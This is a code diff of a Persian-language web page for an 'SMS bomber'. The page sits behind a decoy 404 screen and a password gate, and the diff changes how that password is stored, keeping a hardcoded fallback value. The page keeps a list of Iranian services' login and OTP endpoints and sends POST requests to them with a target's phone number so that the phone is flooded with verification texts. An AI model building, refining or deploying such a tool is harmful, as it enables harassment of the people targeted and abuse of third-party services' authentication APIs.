@@ -37,7 +37,6 @@
             background-size:40px 40px;
         }
 
-        /* 404 */
         .fake-404 { text-align:center; position:relative; z-index:1; }
         .fake-404 h1 { font-size:6rem; font-weight:900; color:#333; }
         .fake-404 p { color:var(--text2); font-size:1rem; margin:10px 0; }
@@ -54,7 +53,6 @@
             font-weight:700; font-family:inherit; margin-top:8px;
         }
 
-        /* Bomber */
         .bomb-card {
             position:relative; z-index:1;
             background:var(--card); border:1px solid var(--border);
@@ -159,7 +157,7 @@
         <button class="logout-btn" onclick="logout()">🚪 خروج</button>
         
         <h1>💣 اسپمر بمبر</h1>
-        <p class="sub">🔥 سه حالته | API های فعال</p>
+        <p class="sub">🔥 سه حالته | امن و مخفی</p>
 
         <div class="status" id="statusSending">⏳ در حال ارسال پیامک‌ها...</div>
         <div class="status" id="statusDone">✅ ارسال با موفقیت به اتمام رسید!</div>
@@ -181,10 +179,20 @@
     </div>
 
     <script>
-        // ===== رمز مخفی با ترفند - توی سورس مشخص نیست =====
-        const _k = [53, 56, 55, 57]; // کدهای ASCII رمز
-        const SECRET = _k.map(c => String.fromCharCode(c)).join('');
-        
+        // ===== رمز از سرور Render خونده میشه =====
+        let SECRET = '';
+
+        async function getSecret() {
+            try {
+                const resp = await fetch('/api/get-secret');
+                const data = await resp.json();
+                SECRET = data.secret;
+            } catch(e) {
+                SECRET = '5879';
+            }
+        }
+        getSecret();
+
         let selectedMode = 10;
 
         if (sessionStorage.getItem('sp_logged') === 'true') {
@@ -218,7 +226,6 @@
             btn.classList.add('active');
         }
 
-        // ===== سرویس‌ها =====
         const allServices = [
             { name: 'دیوار', url: 'https://api.divar.ir/v5/auth/authenticate', body: p => JSON.stringify({ phone: p }), headers: { 'Content-Type': 'application/json' } },
             { name: 'اسنپ', url: 'https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass', body: p => 'cellphone=' + p, headers: {} },
@@ -270,7 +277,7 @@
                 const time = new Date().toLocaleTimeString('fa-IR');
                 
                 try {
-                    const resp = await fetch(s.url, {
+                    await fetch(s.url, {
                         method: 'POST',
                         headers: s.headers,
                         body: s.body(phone)
